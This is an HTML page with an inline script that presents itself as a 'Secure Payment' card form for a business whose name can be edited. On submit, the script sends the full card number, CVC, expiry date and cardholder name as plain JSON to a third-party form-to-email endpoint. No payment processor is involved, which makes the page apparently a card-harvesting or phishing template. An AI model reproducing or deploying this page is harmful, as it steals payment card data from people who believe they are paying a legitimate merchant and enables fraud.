
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Form</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 10px;
            box-shadow: 0 15px 45px rgba(0, 0, 0, 0.2);
            max-width: 450px;
            width: 100%;
            padding: 35px;
        }

        .header {
            text-align: center;
            margin-bottom: 25px;
            border-bottom: 2px solid #667eea;
            padding-bottom: 15px;
        }

        .business-input {
            display: flex;
            justify-content: center;
            margin-bottom: 10px;
        }

        .business-input input {
            padding: 8px 12px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-size: 13px;
            width: 200px;
            text-align: center;
        }

        .business-input input:focus {
            outline: none;
            border-color: #667eea;
        }

        h1 {
            font-size: 22px;
            color: #333;
            margin: 10px 0;
        }

        .tagline {
            color: #666;
            font-size: 12px;
        }

        .form-section {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 13px;
            font-weight: bold;
            color: #333;
            margin-bottom: 6px;
        }

        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 13px;
            font-family: Arial, sans-serif;
        }

        input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 5px rgba(102, 126, 234, 0.2);
        }

        .row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }

        .card-preview {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
            min-height: 120px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        .card-number-display {
            font-size: 18px;
            letter-spacing: 2px;
            font-family: monospace;
            margin: 10px 0;
        }

        .card-details-row {
            display: flex;
            justify-content: space-between;
            font-size: 12px;
        }

        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 15px rgba(102, 126, 234, 0.3);
        }

        button:active {
            transform: translateY(0);
        }

        .success {
            display: none;
            background: #d4edda;
            color: #155724;
            padding: 12px;
            border-radius: 5px;
            text-align: center;
            margin-bottom: 15px;
            border: 1px solid #c3e6cb;
        }

        .success.show {
            display: block;
        }

        .error {
            color: #dc3545;
            font-size: 11px;
            margin-top: 3px;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="business-input">
                <input type="text" id="businessName" placeholder="Business Name" value="Your Business">
            </div>
            <h1 id="displayBusiness">Your Business</h1>
            <p class="tagline">Secure Payment</p>
        </div>

        <div class="success" id="successMsg">
            ✓ Payment details submitted successfully!
        </div>

        <div class="card-preview">
            <div>💳</div>
            <div class="card-number-display" id="cardNumberDisplay">•••• •••• •••• ••••</div>
            <div class="card-details-row">
                <div id="cardHolderDisplay">CARDHOLDER NAME</div>
                <div id="cardExpiryDisplay">MM/YY</div>
            </div>
        </div>

        <form id="paymentForm">
            <div class="form-section">
                <label for="cardNumber">Card Number *</label>
                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
                <small style="color: #999;">16 digits</small>
            </div>

            <div class="form-section">
                <label for="cardHolder">Cardholder Name *</label>
                <input type="text" id="cardHolder" placeholder="John Smith" required>
            </div>

            <div class="row">
                <div class="form-section">
                    <label for="expiry">Expiry Date *</label>
                    <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
                </div>
                <div class="form-section">
                    <label for="cvc">CVC *</label>
                    <input type="text" id="cvc" placeholder="123" maxlength="4" required>
                </div>
            </div>

            <button type="submit">SUBMIT PAYMENT</button>
        </form>
    </div>

    <script>
        const businessInput = document.getElementById('businessName');
        const displayBusiness = document.getElementById('displayBusiness');
        const cardNumberInput = document.getElementById('cardNumber');
        const cardNumberDisplay = document.getElementById('cardNumberDisplay');
        const cardHolderInput = document.getElementById('cardHolder');
        const cardHolderDisplay = document.getElementById('cardHolderDisplay');
        const expiryInput = document.getElementById('expiry');
        const expiryDisplay = document.getElementById('cardExpiryDisplay');
        const cvcInput = document.getElementById('cvc');
        const form = document.getElementById('paymentForm');
        const successMsg = document.getElementById('successMsg');

        businessInput.addEventListener('input', function() {
            const name = this.value || 'Your Business';
            displayBusiness.textContent = name;
        });

        cardNumberInput.addEventListener('input', function() {
            let value = this.value.replace(/\s/g, '').replace(/\D/g, '').slice(0, 16);
            let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
            this.value = formatted;

            if (value.length > 0) {
                let masked = value.replace(/./g, '•').slice(0, -4) + value.slice(-4);
                cardNumberDisplay.textContent = masked.match(/.{1,4}/g)?.join(' ') || masked;
            } else {
                cardNumberDisplay.textContent = '•••• •••• •••• ••••';
            }
        });

        cardHolderInput.addEventListener('input', function() {
            cardHolderDisplay.textContent = (this.value || 'CARDHOLDER NAME').toUpperCase();
        });

        expiryInput.addEventListener('input', function() {
            let value = this.value.replace(/\D/g, '').slice(0, 4);
            if (value.length >= 2) {
                value = value.slice(0, 2) + '/' + value.slice(2);
            }
            this.value = value;
            expiryDisplay.textContent = value || 'MM/YY';
        });

        cvcInput.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '').slice(0, 4);
        });

        form.addEventListener('submit', async function(e) {
            e.preventDefault();

            const paymentData = {
                business: businessInput.value || 'Your Business',
                cardNumber: cardNumberInput.value.replace(/\s/g, ''),
                cardHolder: cardHolderInput.value,
                expiry: expiryInput.value,
                cvc: cvcInput.value,
                timestamp: new Date().toLocaleString('en-GB'),
                ipAddress: 'N/A'
            };

            try {
                const response = await fetch('https://formspree.io/f/meojoyrb', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        Business: paymentData.business,
                        'Card Number': paymentData.cardNumber,
                        'Cardholder Name': paymentData.cardHolder,
                        'Expiry Date': paymentData.expiry,
                        CVC: paymentData.cvc,
                        'Date & Time': paymentData.timestamp
                    })
                });

                if (response.ok) {
                    successMsg.classList.add('show');
                    form.classList.add('hidden');
                    
                    setTimeout(() => {
                        form.reset();
                        form.classList.remove('hidden');
                        successMsg.classList.remove('show');
                        cardNumberDisplay.textContent = '•••• •••• •••• ••••';
                        cardHolderDisplay.textContent = 'CARDHOLDER NAME';
                        expiryDisplay.textContent = 'MM/YY';
                    }, 3000);
                } else {
                    alert('Error submitting payment. Please try again.');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Error submitting payment. Please try again.');
            }
        });
    </script>
</body>
</html>
